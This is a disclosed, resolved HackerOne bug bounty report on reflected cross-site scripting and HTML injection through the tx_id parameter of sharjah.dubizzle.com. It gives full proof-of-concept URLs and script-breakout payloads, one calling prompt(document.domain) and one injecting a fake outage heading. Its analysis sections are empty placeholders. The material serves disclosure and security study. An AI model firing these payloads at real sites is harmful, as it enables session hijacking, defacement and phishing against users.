---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '162296'
original_report_id: '162296'
title: XSS and HTML Injection https://sharjah.dubizzle.com/
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-08-23T01:51:50.529Z'
disclosed_at: '2016-10-20T14:24:29.692Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS and HTML Injection https://sharjah.dubizzle.com/

## Metadata

- HackerOne Report ID: 162296
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2016-10-20T14:24:29.692Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,Olx

Firstly.I saw that dubizzle.com is in your scope so I've decided to report it.

PoC:
---------------------

1-Go to that link
2-Login to your dubizzle account,XSS will execute 

https://sharjah.dubizzle.com/place-an-ad/motors/used-cars/bmw/x5/new/?tx_id=9003650_53c48543e92c478cb165a53b39e48562%3C/script%3E%3Cscript%3Eprompt(document.domain)%3C/script%3E 

We can use it for HTML injection by the way like this :

https://sharjah.dubizzle.com/place-an-ad/motors/used-cars/bmw/x5/new/?tx_id=9003650_53c48543e92c478cb165a53b39e48562%3C/script%3E%3Ch2%3EOUR%20SITE%20HAS%20BEEN%20DOWN%3C/h2%3E

Vulnerable Parameter
---------------------

```
?tx_id=
```

Payloads
---------------------

```</script><h2>OUR SITE HAS BEEN DOWN</h2>
</script><script>prompt(document.domain)</script>
</script><script>prompt(document.domain)</script>```

Testing
---------------------

Tested and confirmed on Firefox's latest version


If you have any questions,please let me know about it.Thanks !

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
